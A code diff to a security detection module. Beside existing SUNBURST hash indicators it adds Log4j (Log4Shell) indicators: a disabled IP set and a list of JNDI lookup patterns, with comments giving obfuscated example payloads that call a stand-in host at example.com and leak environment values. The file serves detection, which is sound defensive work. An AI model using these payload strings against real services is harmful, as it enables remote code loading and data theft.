@@ -34,7 +34,42 @@ SUNBURST_SHA256_IOCS = {
     "d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600",
 }
 
+# LOG4J IOCs:
+# IPs Pulled from the following sources, deduped and compiled here.
+# https://gist.github.com/gnremy/c546c7911d5f876f263309d7161a7217
+# https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Log4j_IOC_List.csv
+# https://raw.githubusercontent.com/Malwar3Ninja/Exploitation-of-Log4j2-CVE-2021-44228/main/Threatview.io-log4j2-IOC-list
+# Created 12-13-21
 
+LOG4J_IP_IOCS = {
+    # The rule using this set has been deprecated and disabled by default
+    "0.0.0.1"
+}
+
+# Example sources:
+# - https://www.fastly.com/blog/new-data-and-insights-into-log4shell-attacks-cve-2021-44228
+# - https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/
+LOG4J_EXPLOIT_IOCS = {
+    "jndi:ldap:/",
+    "jndi:rmi:/",
+    "jndi:ldaps:/",
+    "jndi:dns:/",
+    "jndi:nis:/",
+    "jndi:nds:/",
+    "jndi:corba:/",
+    "jndi:iiop:/",
+    "jndi:${",
+    "${jndi:",  # breadth
+    "${lower:",  # example: ${jn${lower:d}i:l${lower:d}ap://example.${lower:c}om:1234/callback}
+    "${upper:",  # example: ${jnd${upper:i}:ldap://example.com:1234/callback/}
+    "${env:",  # example: ${jndi:ldap://example.com:1234/callback/${env:USER}
+    "${sys:",  # example: ${jndi:ldap://example.com:1234/callback/${sys:java.version}
+    "${java:",  # example: ${jndi:ldap://example.com:1234/callback/${java:os}
+    "${date:",  # example: ${jndi:ldap://example.com:1234/callback/${date:MM-dd-yyyy}
+    "${::-j",  # example: ${${::-j}${::-n}di:${::-l}d${::-a}p://example.com:1234/callback}
+}
+
+# IOC Helper functions:
 def ioc_match(indicators: list, known_iocs: set) -> list:
     """Matches a set of indicators against known Indicators of Compromise
 
